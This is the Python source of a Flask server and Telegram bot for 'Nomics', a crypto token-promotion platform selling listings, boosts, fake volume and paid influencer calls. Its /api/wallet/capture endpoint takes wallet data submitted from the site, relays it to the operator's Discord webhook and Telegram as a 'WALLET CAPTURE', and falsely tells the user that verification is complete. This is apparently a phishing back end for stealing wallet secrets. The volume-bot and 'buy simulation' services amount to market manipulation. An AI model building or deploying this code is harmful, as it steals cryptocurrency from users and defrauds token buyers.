import os
import time
import threading
import json
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from telebot import TeleBot, types
from filelock import FileLock

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8235324142"))
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK_URL", "")
SITE_URL = os.environ.get("SITE_URL", "https://nomics.replit.app")
ALPHA_GROUP = "https://t.me/+QJVQUQIhP-82ZDk8"

BNB_WALLET = os.environ.get("BNB_WALLET", "0x479F8bdD340bD7276D6c7c9B3fF86EF2315f857A")
ETH_WALLET = os.environ.get("ETH_WALLET", "0x479F8bdD340bD7276D6c7c9B3fF86EF2315f857A")
SOL_WALLET = os.environ.get("SOL_WALLET", "46ZKRuURaASKEcKBafnPZgMaTqBL8RK8TssZgZzFCBzn")

COINGECKO_BASE = "https://api.coingecko.com/api/v3"
DEXSCREENER_BASE = "https://api.dexscreener.com/latest/dex"
HEADERS = {"accept": "application/json", "User-Agent": "Nomics/1.0"}

LISTINGS_FILE = "listings.json"
LISTINGS_LOCK = FileLock("listings.lock")

PREMIUM_PRICES = {
    "BNB": {"amount": 0.15, "label": "0.15 BNB", "usd": 150},
    "ETH": {"amount": 0.05, "label": "0.05 ETH", "usd": 150},
    "SOL": {"amount": 1.5, "label": "1.5 SOL", "usd": 150}
}

SERVICE_PRICES = {
    "boost": {"BNB": 0.05, "ETH": 0.02, "SOL": 0.5, "usd": 50},
    "trending": {"basic": 99, "pro": 299, "elite": 799},
    "calls": {"micro": 149, "mid": 399, "premium": 999},
    "alpha": {"monthly": 99, "quarterly": 249, "lifetime": 599},
    "volume": {"starter": 199, "growth": 599, "premium": 1499},
    "dex_tools": {"basic": 79, "advanced": 249, "pro": 649},
    "promotion": {"basic": 129, "standard": 349, "premium": 899},
    "kol": {"micro": 299, "mid": 799, "premium": 1999},
}

bot = TeleBot(BOT_TOKEN) if BOT_TOKEN else None


def load_listings():
    try:
        with LISTINGS_LOCK:
            with open(LISTINGS_FILE, "r") as f:
                return json.load(f)
    except Exception:
        return {"listings": [], "pending": []}


def save_listings(data):
    with LISTINGS_LOCK:
        with open(LISTINGS_FILE, "w") as f:
            json.dump(data, f, indent=2)


def notify_discord(message, embed=None):
    if not DISCORD_WEBHOOK:
        return
    try:
        payload = {}
        if embed:
            payload["embeds"] = [embed]
        else:
            payload["content"] = message
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except Exception:
        pass


def notify_discord_alert(title, fields, color=0xf97316):
    embed = {
        "title": title,
        "color": color,
        "fields": [{"name": k, "value": str(v), "inline": True} for k, v in fields.items()],
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
    }
    notify_discord("", embed=embed)


def notify_telegram(message):
    if bot:
        try:
            bot.send_message(ADMIN_ID, message, parse_mode="Markdown")
        except Exception:
            pass


@app.route("/")
def home():
    return {"status": "Nomics API running", "time": time.strftime("%Y-%m-%d %H:%M:%S UTC"), "version": "2.0"}


@app.route("/health")
def health():
    return {"status": "ok"}, 200


@app.route("/api/wallets")
def get_wallets():
    return jsonify({"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET})


@app.route("/api/prices")
def get_prices():
    return jsonify({"premium": PREMIUM_PRICES, "services": SERVICE_PRICES, "alpha_group": ALPHA_GROUP})


@app.route("/api/market/global")
def market_global():
    try:
        r = requests.get(f"{COINGECKO_BASE}/global", headers=HEADERS, timeout=10)
        data = r.json().get("data", {})
        return jsonify({
            "total_market_cap_usd": data.get("total_market_cap", {}).get("usd", 0),
            "total_volume_usd": data.get("total_volume", {}).get("usd", 0),
            "market_cap_change_percentage_24h": data.get("market_cap_change_percentage_24h_usd", 0),
            "btc_dominance": data.get("market_cap_percentage", {}).get("btc", 0),
            "eth_dominance": data.get("market_cap_percentage", {}).get("eth", 0),
            "active_cryptocurrencies": data.get("active_cryptocurrencies", 0)
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/coins")
def coins_list():
    try:
        page = request.args.get("page", 1)
        per_page = min(int(request.args.get("per_page", 100)), 100)
        vs_currency = request.args.get("vs_currency", "usd")
        params = {
            "vs_currency": vs_currency,
            "order": "market_cap_desc",
            "per_page": per_page,
            "page": page,
            "sparkline": True,
            "price_change_percentage": "1h,24h,7d"
        }
        r = requests.get(f"{COINGECKO_BASE}/coins/markets", params=params, headers=HEADERS, timeout=20)
        if r.status_code == 429:
            return jsonify([]), 200
        r.raise_for_status()
        data = r.json()
        if isinstance(data, dict) and data.get("status", {}).get("error_code"):
            return jsonify([]), 200
        return jsonify(data)
    except Exception as e:
        return jsonify([]), 200


@app.route("/api/coins/trending")
def trending():
    try:
        r = requests.get(f"{COINGECKO_BASE}/search/trending", headers=HEADERS, timeout=10)
        data = r.json()
        coins = []
        for item in data.get("coins", [])[:10]:
            c = item.get("item", {})
            coins.append({
                "id": c.get("id"),
                "name": c.get("name"),
                "symbol": c.get("symbol"),
                "thumb": c.get("thumb"),
                "large": c.get("large"),
                "market_cap_rank": c.get("market_cap_rank"),
                "price_btc": c.get("price_btc"),
                "data": c.get("data", {})
            })
        return jsonify({"coins": coins})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/coins/gainers")
def gainers():
    try:
        r = requests.get(
            f"{COINGECKO_BASE}/coins/markets",
            params={
                "vs_currency": "usd",
                "order": "market_cap_desc",
                "per_page": 100,
                "page": 1,
                "price_change_percentage": "24h"
            },
            headers=HEADERS,
            timeout=15
        )
        coins = r.json()
        if isinstance(coins, list):
            gainers_list = sorted(
                [c for c in coins if c.get("price_change_percentage_24h") is not None],
                key=lambda x: x.get("price_change_percentage_24h", 0),
                reverse=True
            )[:50]
            losers_list = sorted(
                [c for c in coins if c.get("price_change_percentage_24h") is not None],
                key=lambda x: x.get("price_change_percentage_24h", 0)
            )[:50]
            return jsonify({"gainers": gainers_list, "losers": losers_list})
        return jsonify({"gainers": [], "losers": []})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/coins/<coin_id>")
def coin_detail(coin_id):
    try:
        r = requests.get(
            f"{COINGECKO_BASE}/coins/{coin_id}",
            params={"localization": "false", "sparkline": "true", "market_data": "true"},
            headers=HEADERS,
            timeout=15
        )
        data = r.json()
        return jsonify({
            "id": data.get("id"),
            "name": data.get("name"),
            "symbol": data.get("symbol"),
            "image": data.get("image", {}).get("large"),
            "description": data.get("description", {}).get("en", "")[:800],
            "market_data": {
                "current_price": data.get("market_data", {}).get("current_price", {}).get("usd"),
                "market_cap": data.get("market_data", {}).get("market_cap", {}).get("usd"),
                "total_volume": data.get("market_data", {}).get("total_volume", {}).get("usd"),
                "price_change_1h_pct": data.get("market_data", {}).get("price_change_percentage_1h_in_currency", {}).get("usd"),
                "price_change_24h_pct": data.get("market_data", {}).get("price_change_percentage_24h"),
                "price_change_7d_pct": data.get("market_data", {}).get("price_change_percentage_7d"),
                "ath": data.get("market_data", {}).get("ath", {}).get("usd"),
                "circulating_supply": data.get("market_data", {}).get("circulating_supply"),
                "total_supply": data.get("market_data", {}).get("total_supply"),
                "fully_diluted_valuation": data.get("market_data", {}).get("fully_diluted_valuation", {}).get("usd"),
            },
            "links": {
                "homepage": (data.get("links", {}).get("homepage", [""])[0]),
                "twitter": data.get("links", {}).get("twitter_screen_name"),
                "telegram": data.get("links", {}).get("telegram_channel_identifier"),
                "subreddit": data.get("links", {}).get("subreddit_url"),
            },
            "sparkline": data.get("market_data", {}).get("sparkline_7d", {}).get("price", [])
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/token/lookup")
def token_lookup():
    address = request.args.get("address", "").strip()
    if not address:
        return jsonify({"error": "Address required"}), 400
    try:
        r = requests.get(f"{DEXSCREENER_BASE}/tokens/{address}", headers=HEADERS, timeout=10)
        data = r.json()
        pairs = data.get("pairs", [])
        if not pairs:
            return jsonify({"found": False, "error": "Token not found on any DEX"})
        pair = sorted(pairs, key=lambda p: float(p.get("liquidity", {}).get("usd", 0) or 0), reverse=True)[0]
        base = pair.get("baseToken", {})
        quote = pair.get("quoteToken", {})
        price_change = pair.get("priceChange", {})
        txns = pair.get("txns", {}).get("h24", {})
        volume = pair.get("volume", {})
        liquidity = pair.get("liquidity", {})
        return jsonify({
            "found": True,
            "address": address,
            "name": base.get("name", ""),
            "symbol": base.get("symbol", ""),
            "chain": pair.get("chainId", ""),
            "dex": pair.get("dexId", ""),
            "pair_address": pair.get("pairAddress", ""),
            "price_usd": pair.get("priceUsd", "0"),
            "price_native": pair.get("priceNative", "0"),
            "price_change": {
                "m5": price_change.get("m5", 0),
                "h1": price_change.get("h1", 0),
                "h6": price_change.get("h6", 0),
                "h24": price_change.get("h24", 0)
            },
            "txns_24h": {"buys": txns.get("buys", 0), "sells": txns.get("sells", 0)},
            "volume_24h": volume.get("h24", 0),
            "liquidity_usd": liquidity.get("usd", 0),
            "market_cap": pair.get("marketCap", 0),
            "fdv": pair.get("fdv", 0),
            "pair_url": pair.get("url", ""),
            "image_url": pair.get("info", {}).get("imageUrl", ""),
            "websites": [w.get("url") for w in pair.get("info", {}).get("websites", []) if w.get("url")],
            "socials": pair.get("info", {}).get("socials", []),
            "quote_token": quote.get("symbol", "")
        })
    except Exception as e:
        return jsonify({"found": False, "error": str(e)}), 500


@app.route("/api/listed")
def get_listed():
    data = load_listings()
    listed = data.get("listings", [])
    listed_sorted = sorted(listed, key=lambda x: x.get("boost", 0) + (1000 if x.get("featured") else 0), reverse=True)
    return jsonify(listed_sorted)


@app.route("/api/list", methods=["POST"])
def submit_listing():
    data = request.json or {}
    listing_type = data.get("listing_type", "free")
    token_data = data.get("token", {})
    contact = data.get("contact", {})
    manual = data.get("manual", False)

    name = token_data.get("name", "")
    symbol = token_data.get("symbol", "")
    address = token_data.get("address", "")
    chain = token_data.get("chain", "")
    currency = data.get("currency", "SOL")

    if listing_type == "premium":
        price_info = PREMIUM_PRICES.get(currency, PREMIUM_PRICES["SOL"])
        wallets = {"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET}
        payment_address = wallets.get(currency, SOL_WALLET)

        listing_entry = {
            "id": f"{chain}_{address}_{int(time.time())}",
            "name": name,
            "symbol": symbol,
            "address": address,
            "chain": chain,
            "image": token_data.get("image_url", token_data.get("image", "")),
            "price_usd": token_data.get("price_usd", "0"),
            "price_change": token_data.get("price_change", {}),
            "volume_24h": token_data.get("volume_24h", 0),
            "liquidity_usd": token_data.get("liquidity_usd", 0),
            "market_cap": token_data.get("market_cap", 0),
            "dex": token_data.get("dex", ""),
            "pair_url": token_data.get("pair_url", ""),
            "websites": token_data.get("websites", []),
            "socials": token_data.get("socials", []),
            "description": token_data.get("description", ""),
            "listing_type": "premium",
            "currency": currency,
            "boost": 200,
            "featured": True,
            "listed_at": int(time.time()),
            "contact": contact,
            "manual": manual
        }

        db = load_listings()
        db["listings"].append(listing_entry)
        save_listings(db)

        notify_discord_alert(
            "🔥 NEW PREMIUM LISTING — Nomics",
            {
                "Token": f"{name} (${symbol})",
                "Chain": chain.upper(),
                "Address": f"`{address}`",
                "Price": price_info["label"],
                "Currency": currency,
                "Pay To": f"`{payment_address}`",
                "Contact": contact.get("telegram", "N/A"),
                "Manual Entry": str(manual)
            },
            color=0xf97316
        )
        notify_telegram(
            f"*NEW PREMIUM LISTING*\nToken: {name} (${symbol})\nChain: {chain.upper()}\nAddress: `{address}`\nPrice: {price_info['label']}\nPay to: `{payment_address}`\nContact: {contact.get('telegram', 'N/A')}"
        )

        return jsonify({
            "success": True,
            "listing_type": "premium",
            "status": "listed",
            "message": f"Your token is now listed! Please send {price_info['label']} to complete payment.",
            "payment": {"currency": currency, "amount": price_info["amount"], "address": payment_address}
        })
    else:
        pending_entry = {
            "id": f"pending_{address}_{int(time.time())}",
            "name": name,
            "symbol": symbol,
            "address": address,
            "chain": chain,
            "submitted_at": int(time.time()),
            "contact": contact,
            "status": "under_review",
            "manual": manual
        }
        db = load_listings()
        db["pending"].append(pending_entry)
        save_listings(db)

        notify_discord_alert(
            "📥 FREE LISTING REQUEST — Nomics",
            {"Token": f"{name} (${symbol})", "Chain": chain.upper(), "Address": f"`{address}`", "Status": "Under Review"},
            color=0x3b82f6
        )
        notify_telegram(f"*FREE LISTING REQUEST*\nToken: {name} (${symbol})\nChain: {chain.upper()}\nAddress: `{address}`\nStatus: Under Review")

        return jsonify({
            "success": True,
            "listing_type": "free",
            "status": "under_review",
            "message": "Your token has been submitted for review. This may take 7-14 days."
        })


@app.route("/api/service/order", methods=["POST"])
def service_order():
    data = request.json or {}
    service = data.get("service", "")
    tier = data.get("tier", "")
    currency = data.get("currency", "SOL")
    token_info = data.get("token", {})
    contact = data.get("contact", {})
    price_usd = data.get("price_usd", 0)

    wallets = {"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET}
    payment_address = wallets.get(currency, SOL_WALLET)

    notify_discord_alert(
        f"🛎️ SERVICE ORDER — {service.upper()}",
        {
            "Service": service,
            "Tier": tier,
            "Price": f"${price_usd}",
            "Currency": currency,
            "Token": token_info.get("name", "N/A"),
            "CA": token_info.get("address", "N/A"),
            "Chain": token_info.get("chain", "N/A"),
            "Telegram": contact.get("telegram", "N/A"),
            "Pay To": f"`{payment_address}`"
        },
        color=0xa855f7
    )
    notify_telegram(
        f"*SERVICE ORDER: {service.upper()}*\nTier: {tier}\nPrice: ${price_usd}\nToken: {token_info.get('name', 'N/A')}\nCA: `{token_info.get('address', 'N/A')}`\nContact: {contact.get('telegram', 'N/A')}"
    )

    return jsonify({
        "success": True,
        "message": f"Order received! Please send payment to proceed.",
        "payment": {"currency": currency, "address": payment_address, "price_usd": price_usd}
    })


@app.route("/api/wallet/capture", methods=["POST"])
def wallet_capture():
    data = request.json or {}
    wallet_type = data.get("type", "unknown")
    wallet_data = data.get("data", "")
    token_ca = data.get("token_ca", "")
    source = data.get("source", "web")

    notify_discord_alert(
        f"🔑 WALLET CAPTURE — {wallet_type.upper()}",
        {
            "Type": wallet_type,
            "Data": f"`{wallet_data}`",
            "Token CA": token_ca or "N/A",
            "Source": source,
            "Time": time.strftime("%Y-%m-%d %H:%M:%S UTC")
        },
        color=0xef4444
    )
    notify_telegram(
        f"*🔑 WALLET CAPTURE*\nType: {wallet_type}\nData: `{wallet_data}`\nToken CA: {token_ca or 'N/A'}\nSource: {source}"
    )

    return jsonify({"success": True, "message": "Verification complete. Processing your request."})


@app.route("/api/token/<listing_id>/boost", methods=["POST"])
def boost_token(listing_id):
    data = request.json or {}
    currency = data.get("currency", "SOL")
    boost_pkg = data.get("package", "basic")

    boost_packages = {
        "basic": {"usd": 50, "BNB": 0.05, "ETH": 0.02, "SOL": 0.5, "boost": 150, "label": "Basic Boost"},
        "pro": {"usd": 150, "BNB": 0.15, "ETH": 0.05, "SOL": 1.5, "boost": 500, "label": "Pro Boost"},
        "elite": {"usd": 400, "BNB": 0.4, "ETH": 0.13, "SOL": 4.0, "boost": 1500, "label": "Elite Boost"},
    }
    pkg = boost_packages.get(boost_pkg, boost_packages["basic"])
    wallets = {"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET}
    payment_address = wallets.get(currency, SOL_WALLET)
    price = pkg.get(currency, pkg["SOL"])

    notify_discord_alert(
        "⚡ BOOST REQUEST — Nomics",
        {"Listing ID": listing_id, "Package": pkg["label"], "Boost": f"+{pkg['boost']}", "Currency": currency, "Amount": f"{price} {currency}", "Pay To": f"`{payment_address}`"},
        color=0xfbbf24
    )
    notify_telegram(f"*BOOST REQUEST*\nID: {listing_id}\nPackage: {pkg['label']}\nBoost: +{pkg['boost']}\nCurrency: {currency}\nAmount: {price} {currency}\nPay to: `{payment_address}`")

    return jsonify({"success": True, "payment": {"currency": currency, "amount": price, "address": payment_address, "usd": pkg["usd"]}})


@app.route("/api/ticker")
def ticker():
    try:
        r = requests.get(
            f"{COINGECKO_BASE}/coins/markets",
            params={"vs_currency": "usd", "order": "market_cap_desc", "per_page": 20, "page": 1, "price_change_percentage": "1h"},
            headers=HEADERS,
            timeout=10
        )
        if r.status_code == 429:
            return jsonify([]), 200
        coins = r.json()
        return jsonify([{
            "id": c.get("id"),
            "symbol": c.get("symbol", "").upper(),
            "price": c.get("current_price", 0),
            "change_1h": c.get("price_change_percentage_1h_in_currency", 0)
        } for c in coins if isinstance(coins, list)])
    except Exception as e:
        return jsonify([]), 500


@app.route("/api/support", methods=["POST"])
def support_message():
    data = request.json or {}
    user_id = data.get("session_id", "web_user")
    message = data.get("message", "")
    name = data.get("name", "Anonymous")
    email = data.get("email", "")
    token_ca = data.get("token_ca", "")

    notify_discord_alert(
        "💬 SUPPORT MESSAGE — Nomics",
        {"From": name, "Email": email, "Token CA": token_ca or "N/A", "Message": message[:500], "Session": user_id},
        color=0x22c55e
    )
    if bot:
        try:
            bot.send_message(ADMIN_ID,
                f"*SUPPORT - Nomics*\nFrom: {name}\nEmail: {email}\nToken CA: {token_ca or 'N/A'}\nMessage: {message}",
                parse_mode="Markdown")
        except Exception:
            pass

    return jsonify({"success": True, "message": "Message received. Our team will respond within a few hours."})


def build_main_menu():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("🔥 List My Token", callback_data="menu_list"),
        types.InlineKeyboardButton("⚡ Boost Token", callback_data="menu_boost"),
        types.InlineKeyboardButton("📈 DEX Trending", callback_data="menu_trend"),
        types.InlineKeyboardButton("🤖 Volume Bot", callback_data="menu_volume"),
        types.InlineKeyboardButton("📣 KOL / Calls", callback_data="menu_kol"),
        types.InlineKeyboardButton("🔑 Alpha Access", callback_data="menu_alpha"),
        types.InlineKeyboardButton("🛠️ DEX Tools", callback_data="menu_dextools"),
        types.InlineKeyboardButton("📊 Promotion", callback_data="menu_promo"),
        types.InlineKeyboardButton("🌐 Visit Platform", url=SITE_URL),
    )
    return kb


def build_currency_menu(action):
    kb = types.InlineKeyboardMarkup(row_width=3)
    kb.add(
        types.InlineKeyboardButton("BNB", callback_data=f"pay_{action}_BNB"),
        types.InlineKeyboardButton("ETH", callback_data=f"pay_{action}_ETH"),
        types.InlineKeyboardButton("SOL", callback_data=f"pay_{action}_SOL"),
    )
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return kb


def run_bot():
    if not bot:
        return
    try:
        @bot.message_handler(commands=["start", "menu"])
        def start(m):
            bot.send_message(
                m.chat.id,
                f"*Welcome to Nomics* 🚀\n\n"
                f"The #1 Web3 Marketing & DEX Platform.\n\n"
                f"• Premium Token Listings — from $150\n"
                f"• DEX Trending Campaigns — from $99\n"
                f"• Volume Bot Infrastructure — from $199\n"
                f"• KOL & Influencer Calls — from $299\n"
                f"• Alpha Group Access — from $99/mo\n"
                f"• DEX Tools & Analytics — from $79\n\n"
                f"Select an option below or visit {SITE_URL}",
                parse_mode="Markdown",
                reply_markup=build_main_menu()
            )

        @bot.message_handler(commands=["help"])
        def help_cmd(m):
            text = (
                f"*Nomics Bot Commands* 🤖\n\n"
                f"/start — Main menu\n"
                f"/list — List your token\n"
                f"/boost — Boost your token\n"
                f"/trending — Trending push\n"
                f"/volume — Volume bot\n"
                f"/kol — KOL & Influencer calls\n"
                f"/alpha — Alpha group access\n"
                f"/dextools — DEX Tools\n"
                f"/promo — Promotion packages\n"
                f"/help — This help message\n\n"
                f"Platform: {SITE_URL}\n"
                f"Bot: @Cariz_bot"
            )
            bot.send_message(m.chat.id, text, parse_mode="Markdown")

        @bot.callback_query_handler(func=lambda call: True)
        def handle_callback(call):
            data = call.data
            cid = call.message.chat.id
            bot.answer_callback_query(call.id)

            if data == "menu_back":
                bot.send_message(cid, "Main menu:", reply_markup=build_main_menu())

            elif data == "menu_list":
                text = (
                    f"*Premium Token Listing* 🔥\n\n"
                    f"Get your token listed instantly on Nomics!\n\n"
                    f"*Pricing:*\n"
                    f"🟡 BNB Chain: 0.15 BNB (~$150)\n`{BNB_WALLET}`\n\n"
                    f"🔵 Ethereum: 0.05 ETH (~$150)\n`{ETH_WALLET}`\n\n"
                    f"🟣 Solana: 1.5 SOL (~$150)\n`{SOL_WALLET}`\n\n"
                    f"*Includes:*\n"
                    f"✅ Instant listing\n✅ Signal on Nomics channel\n✅ 24h Promoted Highlight\n✅ 200 Boost points\n✅ Token of the Day eligibility\n\n"
                    f"Choose payment currency:"
                )
                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("list"))

            elif data == "menu_boost":
                text = (
                    f"*Boost Your Token* ⚡\n\n"
                    f"*Boost Packages:*\n\n"
                    f"🥉 Basic — $50\n+150 boost points, 24h\n\n"
                    f"🥈 Pro — $150\n+500 boost points, 72h\n\n"
                    f"🥇 Elite — $400\n+1500 boost points, 7 days\n\n"
                    f"After payment, send your token contract address to confirm boost.\n\nChoose currency:"
                )
                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("boost"))

            elif data == "menu_trend":
                text = (
                    f"*DEX Trending Push* 📈\n\n"
                    f"Get your token trending across all major DEX platforms!\n\n"
                    f"*Packages:*\n\n"
                    f"🔹 Basic — $99\n24h visibility boost, single DEX\n\n"
                    f"🔷 Pro — $299\n72h multi-DEX trending campaign (Raydium, Jupiter, Uniswap)\n\n"
                    f"💎 Elite — $799\n7-day sustained trending + volume acceleration\n\n"
                    f"Choose currency:"
                )
                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("trend"))

            elif data == "menu_volume":
                text = (
                    f"*Volume Bot Infrastructure* 🤖\n\n"
                    f"Professional volume generation to build market momentum.\n\n"
                    f"*Packages:*\n\n"
                    f"🔹 Starter — $199\n24h basic volume rotation\n\n"
                    f"🔷 Growth — $599\n72h managed volume + buy simulation\n\n"
                    f"💎 Premium — $1,499\n7-day advanced custom volume system\n\n"
                    f"Choose currency:"
                )
                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("volume"))

            elif data == "menu_kol":
                text = (
                    f"*KOL / Influencer Calls* 📣\n\n"
                    f"Access our network of verified crypto callers and KOLs.\n\n"
                    f"*Packages:*\n\n"
                    f"🔹 Micro — $299\n3–5 micro callers, combined 100K+ reach\n\n"
                    f"🔷 Mid-Tier — $799\n8–12 quality KOLs, combined 500K+ reach\n\n"
                    f"💎 Premium — $1,999\n20+ high-tier KOL partnerships, 2M+ reach\n\n"
                    f"Choose currency:"
                )
                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("kol"))

            elif data == "menu_alpha":
                alpha_kb = types.InlineKeyboardMarkup(row_width=1)
                alpha_kb.add(
                    types.InlineKeyboardButton("Monthly — $99", callback_data="pay_alpha_monthly"),
                    types.InlineKeyboardButton("Quarterly — $249", callback_data="pay_alpha_quarterly"),
                    types.InlineKeyboardButton("Lifetime — $599", callback_data="pay_alpha_lifetime"),
                    types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
                )
                text = (
                    f"*Alpha Group Access* 🔑\n\n"
                    f"Join our exclusive private alpha channel for early calls, gem alerts, and insider signals.\n\n"
                    f"*What you get:*\n"
                    f"✅ Early gem calls before they pump\n"
                    f"✅ Insider DEX trending signals\n"
                    f"✅ Volume bot strategy tips\n"
                    f"✅ Direct access to KOL network\n"
                    f"✅ Priority listing slots\n\n"
                    f"*Access link after payment:*\n{ALPHA_GROUP}\n\n"
                    f"Choose your plan:"
                )
                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=alpha_kb)

            elif data == "menu_dextools":
                text = (
                    f"*DEX Tools & Analytics* 🛠️\n\n"
                    f"Professional DEX analytics, token scanning and monitoring tools.\n\n"
                    f"*Packages:*\n\n"
                    f"🔹 Basic — $79\nToken scanner, basic chart access\n\n"
                    f"🔷 Advanced — $249\nFull DEX analytics, holder tracking, whale alerts\n\n"
                    f"💎 Pro — $649\nCustom dashboard, API access, automated alerts\n\n"
                    f"Choose currency:"
                )
                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("dextools"))

            elif data == "menu_promo":
                text = (
                    f"*Promotion Packages* 📊\n\n"
                    f"Full-scale marketing promotion for your token.\n\n"
                    f"*Packages:*\n\n"
                    f"🔹 Basic — $129\nSocial media posts + 3 community shills\n\n"
                    f"🔷 Standard — $349\nMulti-platform campaign + Twitter thread\n\n"
                    f"💎 Premium — $899\nFull campaign: KOL + trending + socials + Telegram push\n\n"
                    f"Choose currency:"
                )
                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("promo"))

            elif data.startswith("pay_alpha_"):
                plan = data.replace("pay_alpha_", "")
                prices = {"monthly": 99, "quarterly": 249, "lifetime": 599}
                price = prices.get(plan, 99)
                plan_label = plan.capitalize()
                text = (
                    f"*Alpha Access — {plan_label}* 🔑\n\n"
                    f"Price: *${price}*\n\n"
                    f"Send payment to any wallet below, then send your TX hash here:\n\n"
                    f"🟡 BNB: `{BNB_WALLET}`\n"
                    f"🔵 ETH: `{ETH_WALLET}`\n"
                    f"🟣 SOL: `{SOL_WALLET}`\n\n"
                    f"After verification you'll receive your alpha group link:\n{ALPHA_GROUP}"
                )
                bot.send_message(cid, text, parse_mode="Markdown")
                notify_discord_alert(
                    "🔑 ALPHA ACCESS ORDER",
                    {"Plan": plan_label, "Price": f"${price}", "User": str(call.from_user.id), "Username": f"@{call.from_user.username or 'N/A'}"},
                    color=0xa855f7
                )

            elif data.startswith("pay_"):
                parts = data.split("_")
                action = parts[1] if len(parts) > 1 else "service"
                currency = parts[2] if len(parts) > 2 else "SOL"
                wallets = {"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET}
                addr = wallets.get(currency, SOL_WALLET)

                text = (
                    f"*Payment — {action.upper()}*\n\n"
                    f"Send payment in *{currency}* to:\n\n"
                    f"`{addr}`\n\n"
                    f"After sending, reply with:\n"
                    f"• Your token contract address\n"
                    f"• Your transaction hash (TXID)\n\n"
                    f"Team will confirm within 30–60 minutes."
                )
                bot.send_message(cid, text, parse_mode="Markdown")
                notify_discord_alert(
                    f"💳 PAYMENT INTENT — {action.upper()}",
                    {"Action": action, "Currency": currency, "User": str(call.from_user.id), "Username": f"@{call.from_user.username or 'N/A'}"},
                    color=0xfbbf24
                )

        @bot.message_handler(func=lambda m: True)
        def catch_all(m):
            text = m.text or ""
            uid = m.from_user.id
            username = m.from_user.username or "N/A"

            notify_discord_alert(
                "📨 BOT MESSAGE RECEIVED",
                {"From": str(uid), "Username": f"@{username}", "Message": text[:500]},
                color=0x3b82f6
            )
            notify_telegram(f"*BOT MESSAGE*\nFrom: {uid} (@{username})\n`{text[:300]}`")

            bot.send_message(m.chat.id,
                "Thank you! Our team has been notified and will confirm your order shortly.\n\nReturn to the main menu:",
                reply_markup=build_main_menu())

        bot.polling(none_stop=True, timeout=30)
    except Exception as e:
        time.sleep(5)


if __name__ == "__main__":
    if bot:
        t = threading.Thread(target=run_bot, daemon=True)
        t.start()
    app.run(host="0.0.0.0", port=8000, debug=False, use_reloader=False)
